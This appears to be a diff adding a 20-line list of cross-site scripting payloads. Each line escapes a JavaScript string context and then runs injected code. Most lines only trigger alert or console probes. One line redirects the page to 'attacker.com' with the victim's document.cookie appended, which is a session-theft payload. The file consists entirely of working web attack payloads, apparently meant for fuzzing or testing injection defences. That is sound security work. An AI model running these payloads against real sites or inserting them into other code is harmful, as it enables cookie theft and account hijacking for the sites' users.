@@ -1,0 +1,20 @@
+'); alert('XSS1'); //
+'); alert('XSS2');
+'); } alert('XSS3'); { //
+'); } alert(String.fromCharCode(88,83,83,52)); { //
+'); window.location='http://attacker.com?cookie=' + document.cookie; //
+'); document.write('<img src=x onerror=alert("XSS6")>'); //
+'); console.log('XSS7'); //
+'); eval('alert("XSS8")'); //
+'); setTimeout('alert("XSS9")', 0); //
+'); Function('alert("XSS10")')(); //
+'); Image().src='javascript:alert("XSS11")'; //
+'); document.createElement('img').src='x'; //
+'); location.href='javascript:alert("XSS13")'; //
+'); new Function('alert("XSS14")')(); //
+'); document.body.appendChild(document.createElement('img')).src='x'; //
+'); localStorage.setItem('x', 'alert("XSS16")'); //
+'); sessionStorage.setItem('x', 'alert("XSS17")'); //
+'); window.open('javascript:alert("XSS18")'); //
+'); window.onerror = function() { alert('XSS19'); }; throw 'error'; //
+'); alert(String.fromCharCode(88,83,83,50)); //
